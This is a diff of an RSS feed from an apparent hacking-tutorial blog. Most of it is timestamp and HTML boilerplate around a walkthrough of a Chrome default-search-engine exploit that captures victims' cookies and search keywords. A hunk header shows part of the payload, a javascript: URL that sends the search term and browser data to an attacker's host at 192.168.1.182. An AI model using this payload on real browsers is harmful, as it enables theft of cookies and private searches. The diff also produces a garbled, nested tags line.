@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>metalkey</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sun, 17 Jun 2018 19:41:07 +1000</lastBuildDate>
-<pubDate>Sun, 17 Jun 2018 19:41:07 +1000</pubDate>
+<lastBuildDate>Sun, 17 Jun 2018 19:51:32 +1000</lastBuildDate>
+<pubDate>Sun, 17 Jun 2018 19:51:32 +1000</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Mousejack on the WiFi Pineapple
@@ -39,15 +39,38 @@ root@pineapple:~$ <com>./setup.py install</com><br>
 <dc:creator></dc:creator>
 <pubDate>Fri, 15 Jun 2018 11:46:25 +1000</pubDate></item>
 <item><title>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 Google Chrome Search Poison – Default Search Engine Exploit
 </title><description><![CDATA[
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="main.css" type="text/css" />
+<link rel="stylesheet" href="blog.css" type="text/css" />
+<link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
+<title>Google Chrome Search Poison – Default Search Engine Exploit</title>
+</head><body>
+<div id="divbodyholder">
+<div class="headerholder"><div class="header">
+<div id="title">
+<h1 class="nomargin"><a class="ablack" href="https://metalkey.github.io/index.html">metalkey</a></h1>
+<div id="description">Hacking tutorials + info</div>
+</div></div></div>
+<div id="divbody"><div class="content">
+<!-- entry begin -->
+<h3><a class="ablack" href="google-chrome-search-poison---default-search-engine-exploit.html">
+Google Chrome Search Poison – Default Search Engine Exploit
+</a></h3>
+<!-- bashblog_timestamp: #201708271420.15# -->
+<div class="subtitle">August 27, 2017</div>
 
 <h2>Introduction</h2>
 
-<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser. This stored XSS is then executed whenever the victim searches using the omnibox.<br>
+<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature allowing for the execution of malicious JavaScript whenever the victim performs a search using the omnibox (i.e. URL textbox).<br>
+The malicious JavaScript can be set to perform various functions including: Cookie Stealing, Search Keywords Interception, Browser Fingerprinting, etc...<br>
 In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.<br>
 <br>
-Note: The vulnerability has been reported to (and ignored by) the Google/Chromium team.</p>
+Note: The vulnerability was reported to the Google/Chromium team but was considered a feature rather than a vulnerability.</p>
 
 <h2>Video Demo</h2>
 
@@ -110,13 +133,7 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 
 <p></code></p>
 
-<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
-
-
-
-
-
-
+<p>Tags: <a href='tag_<a href='tag_search-poison.html'>search-poison</a>.html'><a href='tag_search-poison.html'>search-poison</a></a></p>
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
